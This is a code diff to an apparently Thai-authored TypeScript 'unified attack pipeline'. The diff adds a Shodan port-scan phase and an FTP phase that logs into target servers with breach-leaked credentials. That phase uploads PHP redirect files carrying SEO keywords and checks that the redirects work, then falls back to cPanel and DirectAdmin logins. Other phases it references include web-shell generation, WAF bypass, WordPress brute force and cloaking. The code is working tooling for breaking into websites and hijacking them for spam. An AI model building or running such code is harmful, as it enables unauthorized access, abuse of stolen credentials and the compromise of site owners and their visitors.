@@ -51,6 +51,8 @@ import { executeIISUACloaking, type IISCloakingConfig, type IISCloakingResult } 
 import { extractDomainCredentials, type ExtractedCredential } from "./leakcheck-client";
 import { runGenericUploadEngine, type GenericUploadResult, type GenericUploadReport, type GenericUploadConfig } from "./generic-upload-engine";
 import { recordMethodResult } from "./attack-method-tracker";
+import { scanDomainPorts, formatShodanForTelegram, type PortIntelligence } from "./shodan-scanner";
+import { ftpUploadRedirect, ftpBruteForceUpload, type FTPCredential, type FTPUploadResult } from "./ftp-uploader";
 
 // ═══════════════════════════════════════════════════════
 //  TYPES
@@ -98,7 +100,7 @@ export interface PipelineConfig {
 }
 
 export interface PipelineEvent {
-  phase: "ai_analysis" | "prescreen" | "vuln_scan" | "shell_gen" | "upload" | "verify" | "complete" | "error" | "waf_bypass" | "alt_upload" | "indirect" | "dns_attack" | "config_exploit" | "recon" | "cloaking" | "wp_admin" | "wp_db_inject" | "world_update" | "shellless" | "email" | "cf_bypass" | "wp_brute_force" | "post_upload" | "comprehensive" | "smart_fallback" | "iis_cloaking" | "leakcheck_cred" | "breach_hunt";
+  phase: "ai_analysis" | "prescreen" | "vuln_scan" | "shell_gen" | "upload" | "verify" | "complete" | "error" | "waf_bypass" | "alt_upload" | "indirect" | "dns_attack" | "config_exploit" | "recon" | "cloaking" | "wp_admin" | "wp_db_inject" | "world_update" | "shellless" | "email" | "cf_bypass" | "wp_brute_force" | "post_upload" | "comprehensive" | "smart_fallback" | "iis_cloaking" | "leakcheck_cred" | "breach_hunt" | "shodan_scan" | "ftp_upload";
   step: string;
   detail: string;
   progress: number; // 0-100
@@ -191,6 +193,10 @@ export interface PipelineResult {
   iisCloakingResult?: IISCloakingResult | null;
   // LeakCheck Enterprise credential search
   leakcheckCredentials?: ExtractedCredential[] | null;
+  // Shodan port intelligence
+  shodanIntel?: PortIntelligence | null;
+  // FTP upload results
+  ftpUploadResult?: FTPUploadResult | null;
 }
 
 type EventCallback = (event: PipelineEvent) => void;
@@ -521,6 +527,10 @@ const METHOD_REGISTRY: Record<string, string> = {
   iis_webconfig_inject: "iisWebConfigInject",
   // LeakCheck credential takeover
   leakcheck_cred_takeover: "leakcheckCredTakeover",
+  // FTP upload via leaked creds
+  ftp_leaked_cred: "ftpLeakedCred",
+  // Shodan-guided attack
+  shodan_guided: "shodanGuided",
   // AI-generated
   ai_generated_exploit: "aiGeneratedExploit",
   comprehensive: "comprehensiveVectors",
@@ -1796,6 +1806,67 @@ export async function runUnifiedAttackPipeline(
         phase: "breach_hunt" as any,
         step: "error",
         detail: `⚠️ Breach Hunt ล้มเหลว: ${error.message}`,
+        progress: 49,
+      });
+    }
+  }
+
+  // ─── Phase 2.5f: Shodan Port Intelligence ───
+  let shodanIntel: PortIntelligence | null = null;
+
+  if (!shouldStop('shodan_scan') && !hasSuccessfulRedirect()) {
+    try {
+      const targetDomain = config.targetUrl.replace(/^https?:\/\//, "").replace(/\/.*$/, "").replace(/^www\./, "");
+      loggedOnEvent({
+        phase: "shodan_scan" as any,
+        step: "start",
+        detail: `📡 Phase 2.5f: Shodan Port Scan — ค้นหา open ports + services + CVEs...`,
+        progress: 49,
+      });
+
+      shodanIntel = await Promise.race([
+        scanDomainPorts(targetDomain, (msg) => {
+          loggedOnEvent({ phase: "shodan_scan" as any, step: "scanning", detail: `📡 ${msg}`, progress: 49 });
+        }),
+        new Promise<PortIntelligence | null>((_, reject) =>
+          setTimeout(() => reject(new Error("Shodan scan timeout")), capTimeout(25000))
+        ),
+      ]);
+
+      if (shodanIntel) {
+        const openPorts = shodanIntel.allPorts;
+        const relevantPorts: string[] = [];
+        if (shodanIntel.ftpOpen) relevantPorts.push("FTP:21");
+        if (shodanIntel.sshOpen) relevantPorts.push("SSH:22");
+        if (shodanIntel.cpanelOpen) relevantPorts.push("cPanel:2083");
+        if (shodanIntel.directAdminOpen) relevantPorts.push("DA:2222");
+        if (shodanIntel.pleskOpen) relevantPorts.push("Plesk:8443");
+        if (shodanIntel.mysqlOpen) relevantPorts.push("MySQL:3306");
+
+        aiDecisions.push(`📡 Shodan: ${openPorts.length} ports open — ${relevantPorts.join(", ") || "no admin ports"}`);
+        loggedOnEvent({
+          phase: "shodan_scan" as any,
+          step: "complete",
+          detail: `✅ Shodan: ${openPorts.length} ports, ${shodanIntel.vulns.length} CVEs — ${relevantPorts.join(", ") || "no admin ports"}${shodanIntel.sharedDomains.length > 0 ? ` (shared hosting: ${shodanIntel.sharedDomains.length} domains)` : ""}`,
+          progress: 49,
+        });
+
+        if (shodanIntel.vulns.length > 0) {
+          aiDecisions.push(`🔴 Shodan CVEs: ${shodanIntel.vulns.slice(0, 5).join(", ")}`);
+        }
+      } else {
+        loggedOnEvent({
+          phase: "shodan_scan" as any,
+          step: "no_data",
+          detail: `ℹ️ Shodan: ไม่มีข้อมูลสำหรับ IP นี้`,
+          progress: 49,
+        });
+      }
+    } catch (error: any) {
+      loggedOnEvent({
+        phase: "shodan_scan" as any,
+        step: "error",
+        detail: `⚠️ Shodan scan error: ${error.message}`,
         progress: 49,
       });
     }
@@ -3727,6 +3798,7 @@ export async function runUnifiedAttackPipeline(
 
   // ─── Phase 5.6: LeakCheck Enterprise Credential Search + Auto-Takeover ───
   let leakcheckCredentials: ExtractedCredential[] = [];
+  let ftpUploadResult: FTPUploadResult | null = null;
 
   if (!hasSuccessfulRedirect() && !shouldStop('leakcheck_cred')) {
     try {
@@ -3756,18 +3828,28 @@ export async function runUnifiedAttackPipeline(
           progress: 89,
         });
 
+        // Use Shodan intelligence to skip closed ports
+        const ftpAvailable = shodanIntel ? shodanIntel.ftpOpen : true; // assume open if no Shodan data
+        const cpanelAvailable = shodanIntel ? shodanIntel.cpanelOpen : true;
+        const daAvailable = shodanIntel ? shodanIntel.directAdminOpen : true;
+
+        const activeTargets: string[] = [];
+        if (ftpAvailable) activeTargets.push("FTP:21");
+        if (cpanelAvailable) activeTargets.push("cPanel:2083");
+        if (daAvailable) activeTargets.push("DA:2222");
+        if (isWordPress) activeTargets.push("WP");
+
         // Auto-login with leaked credentials: FTP, cPanel, SSH, DirectAdmin
         loggedOnEvent({
           phase: "leakcheck_cred",
           step: "auto_login",
-          detail: `🔑 ลอง auto-login ด้วย ${Math.min(leakcheckCredentials.length, 30)} credentials (FTP/cPanel/SSH/DirectAdmin)...`,
+          detail: `🔑 ลอง auto-login ด้วย ${Math.min(leakcheckCredentials.length, 30)} credentials (${activeTargets.join("/") || "all"})${shodanIntel ? " [Shodan-guided]" : ""}...`,
           progress: 89,
         });
 
         const loginTargets = [
-          { proto: "ftp", port: 21, paths: ["/public_html/", "/www/", "/htdocs/"] },
-          { proto: "cpanel", port: 2083, paths: ["/"] },
-          { proto: "directadmin", port: 2222, paths: ["/"] },
+          ...(cpanelAvailable ? [{ proto: "cpanel", port: 2083, paths: ["/"] }] : []),
+          ...(daAvailable ? [{ proto: "directadmin", port: 2222, paths: ["/"] }] : []),
         ];
 
         for (const cred of leakcheckCredentials.slice(0, 30)) {
@@ -3775,8 +3857,80 @@ export async function runUnifiedAttackPipeline(
 
           const username = cred.username || cred.email.split("@")[0];
 
-          // Try cPanel/DirectAdmin web login
-          for (const target of loginTargets.filter(t => t.proto !== "ftp")) {
+          // ─── FTP Upload via basic-ftp (if port 21 open) ───
+          if (ftpAvailable && !hasSuccessfulRedirect()) {
+            try {
+              loggedOnEvent({
+                phase: "ftp_upload" as any,
+                step: "connecting",
+                detail: `📂 FTP upload: ${username}@${targetDomain}:21...`,
+                progress: 89,
+              });
+
+              const ftpResult = await Promise.race([
+                ftpUploadRedirect({
+                  credential: {
+                    host: targetDomain,
+                    username,
+                    password: cred.password,
+                    port: 21,
+                  },
+                  redirectUrl: config.redirectUrl,
+                  targetDomain,
+                  timeout: 20000,
+                  onProgress: (msg) => loggedOnEvent({ phase: "ftp_upload" as any, step: "progress", detail: `📂 ${msg}`, progress: 89 }),
+                }),
+                new Promise<FTPUploadResult>((_, reject) =>
+                  setTimeout(() => reject(new Error("FTP timeout")), capTimeout(25000))
+                ),
+              ]);
+
+              if (ftpResult.success && ftpResult.url) {
+                ftpUploadResult = ftpResult;
+                aiDecisions.push(`📂 FTP upload สำเร็จ! ${username}@${targetDomain} → ${ftpResult.url} (${ftpResult.method})`);
+                loggedOnEvent({
+                  phase: "ftp_upload" as any,
+                  step: "success",
+                  detail: `✅ FTP upload สำเร็จ! ${ftpResult.url} (${ftpResult.method}, ${ftpResult.duration}ms)`,
+                  progress: 90,
+                });
+
+                const verification = await verifyUploadedFile(ftpResult.url, config.redirectUrl, onEvent);
+                uploadedFiles.push({
+                  url: ftpResult.url,
+                  shell: { type: "redirect_php" as any, content: "", filename: ftpResult.filePath || "redirect.php", contentType: "application/x-php", description: "FTP leaked cred upload", id: `ftp_${Date.now()}`, targetVector: "ftp_leaked_cred", bypassTechniques: ["leaked_cred", "ftp"], redirectUrl: config.redirectUrl, seoKeywords: config.seoKeywords, verificationMethod: "http_get" },
+                  method: `ftp_leaked_${cred.source}`,
+                  verified: verification.verified,
+                  redirectWorks: verification.redirectWorks,
+                  redirectDestinationMatch: verification.redirectDestinationMatch,
+                  finalDestination: verification.finalDestination,
+                  httpStatus: verification.httpStatus,
+                  redirectChain: verification.redirectChain,
+                });
+
+                if (verification.redirectWorks) break;
+              } else {
+                loggedOnEvent({
+                  phase: "ftp_upload" as any,
+                  step: "failed",
+                  detail: `❌ FTP: ${ftpResult.error || "failed"}`,
+                  progress: 89,
+                });
+              }
+            } catch (ftpErr: any) {
+              loggedOnEvent({
+                phase: "ftp_upload" as any,
+                step: "error",
+                detail: `⚠️ FTP error: ${ftpErr.message}`,
+                progress: 89,
+              });
+            }
+          }
+
+          if (hasSuccessfulRedirect()) break;
+
+          // Try cPanel/DirectAdmin web login (Shodan-filtered)
+          for (const target of loginTargets) {
             try {
               const loginUrl = `${config.targetUrl.replace(/^https?/, "https").replace(/\/$/, "")}:${target.port}/login/`;
               const loginResp = await Promise.race([
@@ -4549,6 +4703,14 @@ export async function runUnifiedAttackPipeline(
     cmsScan: cmsScanResult || undefined,
     dbCveMatches: dbCveMatches.length > 0 ? dbCveMatches : undefined,
     aiExploits: aiExploitResults.length > 0 ? aiExploitResults : undefined,
+    // IIS UA Cloaking
+    iisCloakingResult: iisCloakingResult || undefined,
+    // LeakCheck credentials
+    leakcheckCredentials: leakcheckCredentials.length > 0 ? leakcheckCredentials : undefined,
+    // Shodan port intelligence
+    shodanIntel: shodanIntel || undefined,
+    // FTP upload result
+    ftpUploadResult: ftpUploadResult || undefined,
   };
 
   if (fullSuccess) {
